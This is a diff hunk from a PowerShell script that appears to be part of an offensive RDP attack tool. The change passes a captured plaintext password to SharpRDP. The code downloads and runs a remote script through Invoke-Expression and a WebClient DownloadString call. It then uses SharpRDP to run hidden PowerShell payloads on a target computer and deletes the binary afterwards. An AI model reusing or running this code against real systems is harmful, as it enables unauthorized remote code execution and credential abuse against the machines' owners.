@@ -244,18 +244,18 @@ function Remove-Exclusions {
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
         if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } 
-        $Host.UI.RawUI.ForegroundColor = 'Blue' }
+        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' }
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpRDP.ps1')
         if(!$user) { .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
         .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
         .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
         .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
         .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn5" ; Write-Host }
-        if($user) { .\SharpRDP.exe computername=$computer command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$password command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$password command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$password command="powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
-        .\SharpRDP.exe computername=$computer username=$user password=$password command="powershell.exe -windowstyle hidden $Pwn5" ; Write-Host }
+        if($user) { .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
+        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
+        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
+        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
+        .\SharpRDP.exe computername=$computer username=$user password=$PlainTextPassword command="powershell.exe -windowstyle hidden $Pwn5" ; Write-Host }
         del .\SharpRDP.exe }
         
         'M' { Show-Banner ; Show-Modules
